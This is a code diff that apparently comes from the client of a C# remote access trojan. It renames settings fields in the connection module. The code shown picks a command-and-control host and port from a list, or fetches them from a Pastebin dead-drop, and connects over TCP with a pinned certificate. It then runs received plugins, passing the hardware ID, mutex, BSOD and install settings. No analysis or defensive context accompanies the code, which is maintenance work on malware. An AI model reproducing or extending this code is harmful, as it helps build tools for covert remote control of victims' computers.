@@ -80,10 +80,10 @@ namespace Client.Connection
 
         private static void ConnectToServer()
         {
-            if (Settings.Paste_bin == "null")
+            if (Settings.pasteBin == "null")
             {
-                string host = Settings.Hos_ts.Split(',')[new Random().Next(Settings.Hos_ts.Split(',').Length)];
-                int port = Convert.ToInt32(Settings.Por_ts.Split(',')[new Random().Next(Settings.Por_ts.Split(',').Length)]);
+                string host = Settings.hosTs.Split(',')[new Random().Next(Settings.hosTs.Split(',').Length)];
+                int port = Convert.ToInt32(Settings.porTs.Split(',')[new Random().Next(Settings.porTs.Split(',').Length)]);
 
                 if (IsValidDomainName(host))
                 {
@@ -110,10 +110,10 @@ namespace Client.Connection
                 using (WebClient webClient = new WebClient())
                 {
                     webClient.Credentials = new NetworkCredential("", "");
-                    string[] strArray = webClient.DownloadString(Settings.Paste_bin).Split(new[] { ':' }, StringSplitOptions.None);
-                    Settings.Hos_ts = strArray[0];
-                    Settings.Por_ts = strArray[new Random().Next(1, strArray.Length)];
-                    TcpClient.Connect(Settings.Hos_ts, Convert.ToInt32(Settings.Por_ts));
+                    string[] strArray = webClient.DownloadString(Settings.pasteBin).Split(new[] { ':' }, StringSplitOptions.None);
+                    Settings.hosTs = strArray[0];
+                    Settings.porTs = strArray[new Random().Next(1, strArray.Length)];
+                    TcpClient.Connect(Settings.hosTs, Convert.ToInt32(Settings.porTs));
                 }
             }
         }
@@ -122,7 +122,7 @@ namespace Client.Connection
 
         private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
         {
-            return Settings.Server_Certificate.Equals(certificate);
+            return Settings.serverCertificate.Equals(certificate);
         }
 
         public static void Reconnect()
@@ -397,13 +397,13 @@ namespace Client.Connection
                     method?.Invoke(instance, new object[]
                     {
                         TcpClient,
-                        Settings.Server_Certificate,
-                        Settings.Hw_id,
+                        Settings.serverCertificate,
+                        Settings.hwId,
                         unpackMsgPack.ForcePathObject("Msgpack").GetAsBytes(),
                         MutexControl.currentApp,
-                        Settings.MTX,
-                        Settings.BS_OD,
-                        Settings.In_stall
+                        Settings.mtx,
+                        Settings.bsOd,
+                        Settings.inStall
                     });
 
                     Received();
